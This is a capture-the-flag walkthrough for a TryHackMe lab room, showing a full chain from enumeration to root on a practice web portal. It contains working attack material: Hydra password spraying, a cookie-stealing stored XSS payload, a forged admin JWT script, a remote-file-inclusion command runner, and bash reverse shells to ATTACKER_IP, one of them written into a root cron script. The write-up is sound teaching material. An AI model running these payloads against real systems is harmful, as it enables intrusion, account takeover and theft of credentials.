# BSidesGT: Domino

Room: https://tryhackme.com/room/domino

Chain together vulnerabilities in a cascading attack, where every piece you find knocks over the next.

The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/domino.md

---

## 1. Initial Enumeration

Start with directory enumeration:

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,conf,bak,old -t 50
```

Interesting results included:

```text
/admin                301
/api                  301
/auth.php             200
/backup               301
/config.php           200
/dashboard.php        302 -> /index.php
/forgot.php           200
/index.php            200
/logout.php           302 -> /index.php
/static               301
/support              301
/team.php             200
```

The `/backup/README.txt` file revealed an encrypted configuration backup:

```text
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

Download the encrypted config:

```bash
wget http://TARGET/backup/config.enc
```

---

## 2. Backup Decryption

The frontend JavaScript at `/static/app.js` leaked the backup key:

```javascript
// Encryption key for backup config decryption - AES-ECB-128
// Key: REDACTED  (pad to 16 bytes with �)
_backupKey: 'REDACTED'
```

The key was 14 bytes, so it needed two null bytes appended to make a 16-byte AES-128 key.

Hex-encoded key with null padding:

```text
REDACTED_HEX_KEY
```

CyberChef recipe:

```text
AES Decrypt
Key format: Hex
Mode: ECB
Input: Raw
Output: Raw
```

The decrypted config revealed:

```json
{
  "app_name": "NexusCorp Portal",
  "version": "2.3.1",
  "deploy_env": "production",
  "system_user": "devops"
}
```

The `system_user` value became useful later.

---

## 3. Username Generation

The login form hinted that usernames use the format:

```text
firstname.lastname
```

The `/team.php` page exposed staff names and emails. Build a username list:

```bash
cat > usernames.txt << 'EOF'
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
EOF
```

---

## 4. Password Spraying With Hydra

The login form posts to `/index.php` with the parameters `username` and `password`. Failed logins return:

```text
Invalid credentials
```

Hydra command:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -u TARGET http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Hydra found valid credentials for multiple users:

```text
sarah.johnson : REDACTED
robert.wilson : REDACTED
emma.taylor   : REDACTED
```

Log in as `sarah.johnson`.

---

## 5. Authenticated Portal Enumeration

After login, the dashboard showed:

```text
Welcome, sarah.johnson

My Profile API:
/api/users/profile.php?id=3

File Viewer:
Endpoint: /api/files.php?name=
Requires JWT authentication via /api/auth/token.php
```

Request a JWT using the authenticated session cookie:

```bash
TARGET='TARGET'
COOKIE='PASTE_NEXUS_SESSION_COOKIE'

curl -i -s "http://$TARGET/api/auth/token.php" \
  -H "Cookie: nexus_session=$COOKIE"
```

The endpoint returned a JWT and explained that it should be used as a Bearer token for `/api/files.php`.

---

## 6. IDOR in User Profiles

The profile API used an integer ID:

```text
/api/users/profile.php?id=3
```

Changing the ID allowed access to other users' profiles:

```bash
curl -s "http://TARGET/api/users/profile.php?id=1" \
  -H "Cookie: nexus_session=$COOKIE"
```

The admin profile for `laura.hayes` exposed the first flag in the `notes` field.

What is the flag found in the admin user's profile notes? 

```text
THM{REDACTED_FLAG_1}
```

This is a horizontal IDOR because a normal user can read another user's profile by changing the `id` parameter.

---

## 7. Stored XSS and Admin Session Hijack

The support ticket feature was vulnerable to stored XSS. Submit a test payload in a ticket:

```html
<img src=x onerror="fetch('http://ATTACKER_IP/test')">
```

Start a listener:

```bash
sudo nc -lvnp 80
```

The admin bot requested the URL and included an admin session cookie in the outbound request:

```http
GET /test HTTP/1.1
Host: ATTACKER_IP
User-Agent: python-requests/2.31.0
Cookie: nexus_session=REDACTED_ADMIN_COOKIE
```

Use the stolen `nexus_session` cookie in the browser or with curl to access the admin console.

The admin page exposed the second flag:

What is the flag displayed on the admin panel after gaining admin access?

```text
THM{REDACTED_FLAG_2}
```

---

## 8. JWT Role Issue and Secret Reuse

Even with Laura's admin cookie, `/api/auth/token.php` returned a JWT with `role: user`.

Decoded token payload:

```json
{
  "sub": "laura.hayes",
  "role": "user",
  "iat": 0,
  "exp": 0
}
```

Trying to use that token against the file API failed:

```bash
curl -s "http://TARGET/api/files.php?name=/etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
```

Response:

```json
{"error":"Admin JWT required. Check your token payload."}
```

However, the leaked frontend AES key was reused as the JWT signing secret. Create a forged admin JWT:

```bash
python3 - << 'PY'
import base64, json, hmac, hashlib, time

secret = b'REDACTED_JWT_SECRET'

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "sub": "laura.hayes",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

def b64url(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())

sig = hmac.new(
    secret,
    f"{h}.{p}".encode(),
    hashlib.sha256
).digest()

print(f"{h}.{p}.{b64url(sig)}")
PY
```

Store it:

```bash
TOKEN='PASTE_FORGED_ADMIN_JWT'
```

Test the file API:

```bash
curl -s "http://TARGET/api/files.php?name=/etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
```

This no longer failed because of JWT role. It failed because the path was outside `/var/www/html/`:

```json
{"error":"Access denied: path must be within /var/www/html/"}
```

---

## 9. File API Source Review

Read the file API source:

```bash
curl -s "http://TARGET/api/files.php?name=/var/www/html/api/files.php" \
  -H "Authorization: Bearer $TOKEN" | jq -r '.content // .error'
```

Relevant code:

```php
if (($jwt_payload["role"] ?? "") !== "admin") {
    http_response_code(403);
    echo json_encode(["error" => "Admin JWT required. Check your token payload."]);
    exit;
}

// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ...
    eval(str_replace("<?php", "", $remote));
    ...
}
```

The intended break-out was not path traversal. It was remote file inclusion followed by `eval`.

---

## 10. RFI to RCE

On the attacker machine, host a PHP command runner:

```bash
mkdir -p /tmp/rfi
cd /tmp/rfi

cat > cmd.php << 'EOF'
<?php
$cmd = $_GET['cmd'] ?? 'id';
system($cmd);
?>
EOF

sudo python3 -m http.server 80
```

Trigger it through the file API:

```bash
curl -sG "http://TARGET/api/files.php" \
  --data-urlencode "name=http://ATTACKER_IP/cmd.php" \
  --data-urlencode "cmd=id" \
  -H "Authorization: Bearer $TOKEN" | jq -r '.output // .error'
```

Expected output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get a reverse shell:

```bash
nc -lvnp 4444
```

Trigger:

```bash
curl -sG "http://TARGET/api/files.php" \
  --data-urlencode "name=http://ATTACKER_IP/cmd.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
  -H "Authorization: Bearer $TOKEN"
```

The reverse shell lands as `www-data`.

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Flag 3 was stored at `/opt/flag3.txt`:

```bash
cat /opt/flag3.txt
```

 What is the flag found in the devops user's home directory? 

```text
THM{REDACTED_FLAG_3}
```

---

## 11. Database Credentials

A phpMiniAdmin-style file in the web root exposed database credentials:

```php
$ACCESS_PWD='REDACTED';
$DBDEF=array(
'user'=>"app_user",
'pwd'=>"REDACTED",
'db'=>"nexusdb",
'host'=>"localhost",
'port'=>"3306",
);
```

Connect to MySQL:

```bash
mysql -u app_user -p'REDACTED_DB_PASSWORD' -D nexusdb -e 'SHOW TABLES'
```

Tables:

```text
reset_tokens
tickets
users
```

Dump user columns:

```bash
mysql -u app_user -p'REDACTED_DB_PASSWORD' -D nexusdb -e 'SHOW COLUMNS FROM users'
```

Dump users:

```bash
mysql -u app_user -p'REDACTED_DB_PASSWORD' -D nexusdb -e 'SELECT * FROM users'
```

The database confirmed users, bcrypt hashes, roles, and notes. The admin's notes field contained the IDOR flag already obtained.

---

## 12. Reset Token Abuse

The reset API source showed that non-admin reset requests returned the reset token directly:

```php
$token = bin2hex(random_bytes(16));
$db->prepare('DELETE FROM reset_tokens WHERE user_id = ?')->execute([$row['id']]);
$db->prepare('INSERT INTO reset_tokens (token, user_id) VALUES (?, ?)')->execute([$token, $row['id']]);
echo json_encode(['token' => $token, 'reset_url' => '/reset.php?token='.$token]);
```

Request a reset token for a normal user:

```bash
curl -s -X POST "http://TARGET/api/reset.php" \
  -H "Content-Type: application/json" \
  --data '{"username":"robert.wilson"}' | jq
```

The reset page required both `username` and `password`:

```html
<form method="POST" action="/reset.php?token=TOKEN">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

Reset the user's web password:

```bash
curl -i -s -X POST "http://TARGET/reset.php?token=TOKEN" \
  -d 'username=robert.wilson&password=REDACTED_NEW_PASSWORD'
```

This was useful for lateral movement checks, but the main lateral move came from credential reuse.

---

## 13. Lateral Movement to devops

The decrypted backup config hinted at a Linux user:

```json
"system_user": "devops"
```

The database password was reused for the `devops` Linux account.

Switch user:

```bash
su - devops
```

Password:

```text
REDACTED_DB_PASSWORD
```

Read the user flag:

```bash
whoami
cd ~
ls
cat user.txt
```
 What is the flag found in the devops user's home directory? 

```text
THM{REDACTED_FLAG_4}
```

---

## 14. Privilege Escalation Enumeration

As `devops`, check sudo:

```bash
sudo -l
```

`devops` could not run sudo.

Search for writable scripts and interesting files:

```bash
find / -type f -perm -002 -ls 2>/dev/null | grep -Ei 'cron|backup|script|sh|py'
```

Interesting result:

```text
-rwxrwxr-- 1 root devops /opt/monitoring/health_report.sh
```

Inspect it:

```bash
cat /opt/monitoring/health_report.sh
```

The script performed health checks and wrote to `/var/log/nexus_health.log`.

Use `pspy64` to observe scheduled jobs:

```bash
/opt/tools/pspy64
```

`pspy64` showed the monitoring script being executed as root every minute:

```text
UID=0 | /bin/bash /opt/monitoring/health_report.sh
```

---

## 15. Root via Writable Cron Script

Because `devops` could write to a script executed by root, replace the script with a reverse shell.

On the attacker machine:

```bash
nc -lvnp 4446
```

On the target as `devops`:

```bash
cat > /opt/monitoring/health_report.sh << 'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4446 0>&1'
EOF
```

Wait for the next cron run. The listener receives a root shell:

```text
root@tryhackme-2404:~#
```

Read the root flag:

```bash
whoami
cat /root/root.txt
```

What is the root flag?

```text
THM{REDACTED_ROOT_FLAG}
```

---

## Kill Chain Summary

```text
Gobuster discovery
  -> backup README points to encrypted config
  -> frontend JS leaks AES key
  -> decrypt backup config and find devops hint
  -> team page creates firstname.lastname username list
  -> Hydra finds weak user credentials
  -> login as Sarah
  -> IDOR reads Laura admin profile and flag 1
  -> stored XSS in support ticket causes admin bot to send admin cookie
  -> admin console gives flag 2
  -> leaked key reused as JWT signing secret
  -> forge role=admin JWT
  -> file API source reveals RFI + eval
  -> RFI gives RCE as www-data and flag 3
  -> DB config leaks MySQL credentials
  -> DB password reused for devops Linux user and flag 4
  -> devops can edit root-run monitoring cron script
  -> replace script with reverse shell
  -> root shell and root flag
```

---

## Vulnerabilities Identified

- Exposed backup files
- Hardcoded cryptographic key in frontend JavaScript
- Insecure AES-ECB usage
- Weak user passwords
- IDOR in `/api/users/profile.php?id=`
- Stored XSS in support tickets
- Admin bot leaking cookies to attacker-controlled URLs
- JWT signing secret reuse
- Broken JWT authorization design
- File API remote file inclusion with `eval`
- Database credentials exposed in web root
- Password reuse from database credential to Linux user
- Writable script executed by root cron
